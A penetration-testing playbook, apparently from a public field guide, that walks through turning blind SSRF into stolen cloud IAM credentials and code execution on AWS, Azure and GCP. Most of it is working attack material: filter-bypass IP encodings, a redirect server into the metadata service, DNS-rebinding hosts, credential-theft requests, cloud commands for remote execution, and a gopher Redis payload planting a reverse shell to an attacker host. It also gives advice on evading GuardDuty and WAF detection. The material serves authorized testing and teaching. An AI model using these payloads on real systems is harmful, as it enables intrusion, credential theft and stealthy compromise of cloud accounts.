---
tags:
  - hack-notes
  - playbook
  - web
  - aws
---

# Blind SSRF to Cloud Metadata RCE Playbook

> An attacker-controlled URL fetch in a web app is de-blinded out-of-band, filter-bypassed to reach the cloud metadata service, and turned into stolen IAM credentials and remote code execution (or, where IMDSv2/header controls block metadata, pivoted to internal services via gopher).

> **Attack graph position**
> **Fed by:** [File Upload to Web Shell to Foothold](File%20Upload%20to%20Web%20Shell%20to%20Foothold.md), [Indirect Prompt Injection to Data Exfiltration](Indirect%20Prompt%20Injection%20to%20Data%20Exfiltration.md); or direct entry (an SSRF-able web app).
> **Feeds into:** [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md)
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance
| | |
|---|---|
| Goal | Steal cloud IAM credentials via SSRF and reach RCE / account takeover |
| Starting position | Unauthenticated or low-priv access to a web app with a URL-fetch feature (webhook, URL importer, PDF/image renderer, avatar-from-URL, XXE) |
| End state | Cloud role credentials in hand, then RCE on an internal box or full cloud account takeover |
| Key techniques | T1190 Exploit Public-Facing App, T1213/T1552.005 Cloud Instance Metadata API, T1557 redirect/rebind MITM-of-fetch, T1059 Command Execution, T1078.004 Cloud Accounts |
| Prerequisites | A server-side request primitive (full or blind); app runs on a cloud instance (EC2/Azure VM/GCE) or in a container with a role; egress to 169.254.169.254 not blocked at the host |
| Difficulty | Medium (full SSRF) to High (blind + IMDSv2 + egress filtering) |
| Noise level | Moderate to Loud (OOB DNS, GuardDuty credential-exfil alerts, WAF/SSRF-filter logs) |

## Attack Path
```
[1] Find the fetch primitive (webhook / URL import / renderer / XXE-as-SSRF)
        |
[2] De-blind it: point at interactsh / Collaborator, confirm OOB DNS+HTTP hit
        |
[3] Probe internal reach: localhost, 169.254.169.254, internal RFC1918
        |
[4] Filter present? --> run the bypass arsenal
        |   (redirect 302, DNS rebinding, decimal/hex/octal IP,
        |    IPv6-mapped, @-trick, allow-list prefix, fragment)
        v
[5] Reach metadata --> pick the cloud:
        |
        +-- AWS:   IMDSv1 -> creds in one GET
        |          IMDSv2 -> need PUT token + header
        |               |
        |               +-- GET-only / no headers? -----------> [6b]
        |          ECS/EKS task role -> 169.254.170.2 + relative URI (one GET)
        |
        +-- Azure:  /metadata/identity/oauth2/token  + "Metadata: true" header
        |
        +-- GCP:    /computeMetadata/v1/... + "Metadata-Flavor: Google" header
        |
[6a] Got creds --> aws/az/gcloud CLI --> enumerate --> RCE (SSM/Run, deploy, takeover)
        |
[6b] No metadata (IMDSv2 GET-only, header-locked) --> PIVOT internal:
             gopher:// -> Redis CONFIG SET -> cron/webshell RCE
             internal admin panels, unauth services, ECS endpoint
```

## Prerequisites and Setup
- A reachable URL-fetch feature. Hunt for: `url=`, `image_url=`, `webhook`, `callback`, `feed`, `proxy`, `dest`, `redirect`, `import?from=`, `fetch`, SVG/HTML to PDF, "import from URL", SSO metadata-XML loaders, and any XML parser (XXE-as-SSRF).
- An OOB listener. Run interactsh or use Burp Collaborator:
  ```bash
  # self-hosted OOB
  interactsh-client -v
  # gives you something like c8f2....oast.fun and shows DNS/HTTP/SMTP hits live
  ```
- An attacker-controlled host for 302 redirects and DNS rebinding (a small VPS with a public IP, plus a domain you can set short-TTL A records on).
- Tooling: `curl`, Burp Suite (Repeater + Collaborator), `gopherus`, BypassBurrito for WAF/filter bypass payloads, Indago for fuzzing the fetch parameter, awscli/az/gcloud for post-cred enumeration.
- Know the cloud first if you can. A favicon, error banner, response header (`Server`, `x-amz-*`), or DNS of the app often tells you AWS vs Azure vs GCP and saves blind guessing.

## Walkthrough

### Step 1. Find and characterize the fetch primitive
What and why: locate where the server makes an outbound request on your behalf, and decide if you get the response body (full SSRF) or nothing (blind). That decision drives everything downstream.

Example vulnerable request (a typical webhook/URL-import endpoint):
```http
POST /api/v1/import HTTP/1.1
Host: app.victim.com
Content-Type: application/json
Authorization: Bearer <low-priv-token>

{"source_url":"https://example.com/feed.json"}
```

Other shapes to try the same way:
```http
GET /render/pdf?url=https://example.com/page HTTP/1.1
GET /avatar?image_url=https://example.com/a.png HTTP/1.1
```
XXE-as-SSRF (XML endpoints, SSO metadata loaders):
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "http://OOB.oast.fun/xxe"> ]>
<r>&x;</r>
```

Success signal: the response changes based on the URL (status, size, timing) or, for blind, you proceed to Step 2 to prove it fires at all.

Decision: if you get the fetched body reflected, you have full SSRF (read metadata directly). If you get nothing, treat it as blind and lean on OOB plus oracles (Step 7 / Troubleshooting).

### Step 2. De-blind via OOB
What and why: prove the server actually reaches out, and capture whether it does DNS only or full HTTP. A DNS-only hit still confirms SSRF and enables DNS rebinding.

```http
POST /api/v1/import HTTP/1.1
Host: app.victim.com
Content-Type: application/json

{"source_url":"http://c8f2abcd.oast.fun/ping1"}
```
Watch the interactsh client:
```
[c8f2abcd] Received DNS interaction (A) from 203.0.113.20
[c8f2abcd] Received HTTP interaction GET /ping1 from 203.0.113.20
```

Success signal: an inbound DNS and/or HTTP interaction tied to your unique subdomain. Note the source IP (the app's egress NAT) and the User-Agent (fingerprints the fetch library: `python-requests`, `Go-http-client`, `curl`, headless Chrome, `libcurl`, etc.).

Decision: HTTP hit = the client follows through and you can likely read responses or redirect it. DNS-only = use DNS rebinding (Step 4) rather than redirect.

### Step 3. Probe internal reach
What and why: confirm the request originates inside the perimeter and can touch link-local / RFC1918 space. This is the go/no-go for the whole chain.

```http
{"source_url":"http://169.254.169.254/"}        # cloud metadata link-local
{"source_url":"http://127.0.0.1:80/"}            # loopback services
{"source_url":"http://localhost:6379/"}          # local Redis
{"source_url":"http://10.0.0.1/"}                # internal gateway
```
For blind, pair each with timing/size: a hang vs instant error vs different content-length is your oracle (see Troubleshooting).

Success signal: 169.254.169.254 responds (even a 200 with metadata index, or a distinctive timing). If it is filtered, move to Step 4.

### Step 4. Defeat the SSRF filter
What and why: most modern apps validate the URL. Run the bypass arsenal until one reaches link-local. Try cheapest first.

Alternate IP encodings of 169.254.169.254 (and 127.0.0.1) defeat naive string blocklists:
```text
http://169.254.169.254/          # baseline
http://2852039166/               # decimal of 169.254.169.254
http://0xA9.0xFE.0xA9.0xFE/      # dotted hex
http://0xa9fea9fe/               # flat hex
http://0251.0376.0251.0376/      # octal
http://[::ffff:169.254.169.254]/ # IPv4-mapped IPv6
http://[::ffff:a9fe:a9fe]/       # same, hex
http://①⑥⑨.⑤④...                  # rare unicode-digit parsers, try if desperate
```
Allow-list prefix and authority-confusion tricks:
```text
http://169.254.169.254.nip.io/                  # wildcard DNS resolving to link-local
http://metadata.victim.com.attacker.com/        # suffix the allowed host
http://expected-host.com@169.254.169.254/        # @ userinfo, real host is after @
http://169.254.169.254#expected-host.com/        # fragment, real host before #
http://169.254.169.254%2f%2e%2e%2f...            # encoded path tricks
http://0/                                         # 0.0.0.0 shorthand -> loopback on some stacks
```
Redirect bypass (the TOCTOU class, very current). Your server validates clean, then 302s into link-local. This beats validators that only check the first URL but follow redirects (WeasyPrint GHSA-983w-rhvv-gwmv, langchain CVE-2025-29934, Open-WebUI GHSA-rh5x-h6pp-cjj6, Manager.io GHSA-j2xj-xhph-p74j all in this class):
```python
# attacker VPS, served at http://attacker.com/r
# 302 -> metadata
from flask import Flask, redirect
app = Flask(__name__)
@app.route("/r")
def r():
    return redirect("http://169.254.169.254/latest/meta-data/iam/security-credentials/", code=302)
app.run(host="0.0.0.0", port=80)
```
Then the SSRF input is just your clean public URL:
```http
{"source_url":"http://attacker.com/r"}
```
DNS rebinding (TOCTOU on the resolver: validator resolves to a public IP, fetcher re-resolves to link-local). Use a rebinding service or run your own:
```text
# rebinder helpers (resolve A then B on alternate lookups)
http://7f000001.a9fea9fe.rbndr.us/      # rbndr: flips between 127.0.0.1 and 169.254.169.254
http://make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms/   # 1u.ms style
```
Or self-host with a tiny authoritative DNS that answers a public IP on the first query and 169.254.169.254 after, defeating any "resolve once, validate, then hand the hostname back to the HTTP library" pattern (Craft CMS CVE-2026-27127, budibase CVE-2026-54353 are this exact bug).

Success signal: a metadata-shaped response (an AWS index like `ami-id`, `iam/`, `latest/`), or your OOB shows the fetch followed the redirect/rebind.

Decision: redirect works when the client follows 3xx (most do). DNS rebinding works when you only got a DNS hit in Step 2 or when redirects are stripped. If the fetcher is HTTPS-only, you cannot gopher; stick to https redirects into metadata over plain http will fail, so use a rebinding host the client dials over http, or pivot (Troubleshooting: TLS-only fetchers).

### Step 5. Read cloud metadata (pick your cloud)
What and why: with link-local reachable, pull the role credentials. Each cloud has a different endpoint and header requirement.

AWS, IMDSv1 (no token, one GET, easiest):
```http
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
# -> returns the role name, e.g. app-instance-role
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/app-instance-role
# -> JSON with AccessKeyId, SecretAccessKey, Token, Expiration
```
AWS, IMDSv2 (token-gated, needs a PUT and a custom header):
```http
# step 1: PUT to mint a token (needs method + header control)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
# -> returns AQAE... token

# step 2: GET creds carrying the token header
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/app-instance-role
X-aws-ec2-metadata-token: AQAE...
```
If your SSRF is GET-only with no header control, IMDSv2 blocks this. Note the IMDSv2 token packet also defaults to IP TTL 1, so even on success it will not survive a single network hop (relevant if you tried to exfil through a reverse proxy). Branch to Step 6b.

AWS ECS / EKS task role (container, frequently the win when IMDSv2 is on):
```http
# the relative URI lives in env var AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
GET http://169.254.170.2/v2/credentials/<uuid>
# or full-URI variant:
GET http://169.254.170.2/v2/credentials/...   # one plain GET, no token, no header
```
This endpoint is a single unauthenticated GET, so it survives a GET-only/header-less SSRF that IMDSv2 would otherwise stop.

Azure (managed identity, requires the `Metadata: true` header):
```http
GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Metadata: true
# -> access_token for the VM's managed identity
```
The header is mandatory and is Azure's only SSRF guard, so you need header control (or CRLF injection into the request) to set `Metadata: true`. Azure will mint a token for any valid `resource=` audience regardless of whether the identity has rights there, so request `https://management.azure.com/`, `https://vault.azure.net`, `https://storage.azure.com/`, and `https://graph.microsoft.com/` in turn.

GCP (requires the `Metadata-Flavor: Google` header):
```http
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Metadata-Flavor: Google
# -> OAuth2 access_token for the instance service account
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
Metadata-Flavor: Google
```
Also grab `.../project/project-id` and SSH keys at `.../project/attributes/ssh-keys` if scopes allow.

Success signal: a credentials blob (AWS JSON with `Token`, Azure/GCP `access_token`). Save it immediately, it is short-lived.

Decision: header required (Azure/GCP, AWS IMDSv2) but your SSRF cannot set headers -> Step 6b pivot or the ECS endpoint. Header not required (AWS IMDSv1, ECS task role) -> Step 6a.

### Step 6a. Use the stolen credentials (enumerate to RCE / takeover)
What and why: turn credentials into action. Confirm identity first, then enumerate, then escalate to code execution.

```bash
export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name app-instance-role
aws ec2 describe-instances --region us-east-1
```
Paths to RCE / takeover from creds:
```bash
# if ssm:SendCommand on instances -> direct RCE on hosts
aws ssm send-command --document-name "AWS-RunShellScript" \
  --targets "Key=instanceids,Values=i-0abc..." \
  --parameters 'commands=["id;hostname"]' --region us-east-1
# if s3 read on app buckets -> source/secrets -> creds chaining
aws s3 ls; aws s3 cp s3://victim-config/.env -
# if iam:* / PassRole -> privilege escalation to admin
# if lambda:UpdateFunctionCode -> poison a function -> code exec in account
```
Azure:
```bash
az login --identity   # only works on-host; off-host, use the raw token:
curl -H "Authorization: Bearer <token>" \
  https://management.azure.com/subscriptions?api-version=2020-01-01
# enumerate, then Run Command on a VM for RCE:
# az vm run-command invoke -g RG -n VM --command-id RunShellScript --scripts "id"
```
GCP:
```bash
curl -H "Authorization: Bearer <token>" \
  "https://www.googleapis.com/compute/v1/projects/<proj>/zones/<zone>/instances"
# with compute scope -> add SSH key / set startup-script -> RCE on a VM
```

Success signal: `get-caller-identity` resolves, and at least one privileged action returns data rather than AccessDenied.

Decision: stop at the proven primitive. Demonstrate one read and one safe action (e.g. `sts get-caller-identity` plus a benign `ssm` `id` command) rather than mutating production. Escalate only if reversible and it adds evidence.

### Step 6b. Pivot internal (when metadata is header-locked)
What and why: IMDSv2 with no header control, or no metadata at all, does not end the engagement. A GET-only SSRF still reaches internal TCP services; gopher upgrades reach to arbitrary bytes for non-HTTP protocols.

Find local services first (loopback + RFC1918 port probing via timing oracle), then weaponize. Classic win is an unauthenticated Redis on localhost.

Generate a gopher payload that writes a cron job (RCE as the redis user):
```bash
gopherus --exploit redis
# choose reverse shell / cron; it prints a gopher:// URL like:
# gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a ... CONFIG SET dir /var/spool/cron ...
```
Feed it to the SSRF (only works if the fetch library supports gopher, e.g. PHP `curl`, some Java/Go wrappers):
```http
{"source_url":"gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall..."}
```
What Redis exploitation actually does under the hood:
```text
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
SAVE      # writes the cron file -> reverse shell within a minute
```
Other internal pivots that need only http GET: internal admin panels (`http://127.0.0.1:8080/admin`), Spring Boot actuator (`/actuator/env`, `/actuator/heapdump`), Elasticsearch/Kibana, Docker API (`http://127.0.0.1:2375/containers/json` -> container create -> escape), and the ECS endpoint from Step 5.

Success signal: a callback on your listener (reverse shell), or internal admin content reflected/confirmed OOB.

Decision: no gopher support and no header control and no ECS endpoint -> you are limited to GET-based internal recon and the redirect/rebind tricks; document the reachable internal surface as the finding.

## OPSEC and Detection
- OOB DNS is the loudest tell. interactsh/Collaborator lookups for `*.oast.fun` and odd external resolutions from the app egress IP show up in DNS logs and Cloudflare/Umbrella telemetry. Use a neutral-looking domain if you self-host, and minimize the number of unique subdomains.
- WAF / SSRF-filter logs record blocked encodings (`2852039166`, `0xA9FE...`, `@169.254`, `[::ffff:...]`). Each blocked variant is a logged event; spraying the whole arsenal in seconds is an obvious signature. Throttle and try the likely bypass for the observed fetch library first.
- Metadata access from an app server is anomalous. AWS GuardDuty raises `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` (and `.InsideAWS` / `.OutsideAWS`) the moment instance-role creds are used from an IP other than the instance. Using stolen creds off-host is the single most detectable action in this chain. To stay quiet, use creds from on-host (proxy CLI through the SSRF) rather than exfiltrating them.
- CloudTrail logs every API call made with the stolen role: `sts:GetCallerIdentity`, `ssm:SendCommand`, `s3:GetObject`. `ssm send-command` writes `RunCommand` history and per-instance command logs.
- Azure: token requests do not log to the tenant, but use of the token hits Azure Activity Log / Entra sign-in logs. GCP: token use appears in Cloud Audit Logs (`Data Access`).
- Headless-renderer SSRF (PDF/image) is quieter on the app side but still produces the egress DNS/HTTP.
- Reduce noise: prefer the on-host pivot (Step 6b) over credential exfil, batch your bypass attempts, and avoid mutating cloud calls.

## Cleanup
- Rotate/revoke any credentials obtained: notify the client to recycle the instance role or rotate the access key, and let temporary STS/Azure/GCP tokens expire (they are short-lived by design, but request rotation if you logged them anywhere).
- Remove any planted artifacts: delete cron jobs written via Redis (`/var/spool/cron/root`, `/etc/cron.d/*`), remove webshells, kill reverse-shell listeners, and restore any Redis `CONFIG SET dir`/`dbfilename` you changed (`CONFIG SET dir /var/lib/redis`).
- Tear down attacker infrastructure: stop the 302-redirect server, retire the rebinding DNS records, and shut the OOB listener.
- Delete any S3/blob objects or test files you wrote; do not leave SSM command artifacts beyond the single benign proof.
- Record exactly which creds were seen and where they were stored (Burp project, notes) so the client can scope exposure, then purge them from your working files after reporting.

## Troubleshooting
- Blind vs semi-blind: no body returned does not mean no SSRF. Use OOB (Step 2) to confirm, and use oracles to read internal responses. A redirect to your OOB host that includes data in the path can exfiltrate a value the app would not otherwise show.
- Response-size / timing oracles: when the body is hidden, compare content-length, status code, and response time across targets. Open port vs closed port often differs by seconds; a 200 metadata index vs a connection refused differs in size. Script these comparisons with Indago or a Burp Intruder grep-extract.
- TLS-only fetchers: if the client forces https, plain `http://169.254.169.254` and `gopher://` will not dial. Use a DNS-rebinding host the client reaches over https (cert for your domain, A record flips to link-local), or use a 302 from your https host into the metadata service if the client follows cross-scheme redirects. If neither works, the chain is metadata-blocked; pivot to https-reachable internal services.
- Egress filtering / NACL on 169.254.169.254: some hardened hosts block link-local at the host firewall (`iptables`/security group). Metadata is then unreachable regardless of bypass. Confirm with the timing oracle (instant refused), then pivot to internal RFC1918 services and the ECS endpoint.
- Redirect stripped: if the fetch library does not follow 3xx (you saw only the first request in OOB), switch to DNS rebinding.
- IMDSv2 only and GET-only SSRF: you cannot PUT for a token. Go straight to the ECS/EKS task-role endpoint (`169.254.170.2`, no header) or to Step 6b internal pivot.
- Header injection as a bridge: if the endpoint reflects part of your input into the outbound request and you can CRLF-inject, you may be able to add `Metadata: true` / `X-aws-ec2-metadata-token` / `Metadata-Flavor: Google` even from an otherwise header-less primitive. Test for CRLF first when the cloud is Azure/GCP.
- `gopherus` payload fails: ensure you URL-encode the gopher string once for the JSON body, and that the fetch library actually supports the gopher scheme (PHP curl yes, Python requests no, Go default no). If unsupported, fall back to http-only internal recon.

## Variations and Pivots
- XXE-as-SSRF entry: when the primitive is an XML parser, the same metadata fetch runs through an external entity. Blind XXE uses an external DTD to exfiltrate the metadata response via a parameter entity to your OOB host.
- PDF/SVG renderer entry: SSRF often hides in HTML-to-PDF (WeasyPrint, wkhtmltopdf, headless Chrome). Inject `<img src=http://169.254.169.254/...>` or CSS `url()`; renderers frequently follow redirects, enabling the redirect-revalidation bypass class.
- Webhook/callback entry: outbound webhooks and "verify URL" features are reliable full-SSRF, often header-controllable (you set custom webhook headers), which directly unlocks IMDSv2/Azure/GCP without a pivot.
- From AWS creds, full account takeover chain: see [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md) for IAM privesc paths (`PassRole`, `iam:*`, Lambda code poisoning) that convert role creds into persistent admin.
- From RCE on the instance, escalate to the host role locally (no SSRF filter in the way), then into the wider account.
- Chain into cloud post-exploitation: [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md) / [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md) / [GCP Cloud Penetration Test](../Checklists/GCP%20Cloud%20Penetration%20Test.md) for what to do once you hold a role.

## Related
- [Web Application](../Checklists/Web%20Application.md)
- [Web App and Payloads](../Cheatsheets/Web%20App%20and%20Payloads.md)
- [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md)
- [API Security](../Checklists/API%20Security.md)
- BypassBurrito
- Indago
- [AWS Pentest](../Cheatsheets/AWS%20Pentest.md)
- [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md)
- [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md)
- [GCP Cloud Penetration Test](../Checklists/GCP%20Cloud%20Penetration%20Test.md)
- [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md)
- [Reverse Shells and File Transfer](../Cheatsheets/Reverse%20Shells%20and%20File%20Transfer.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
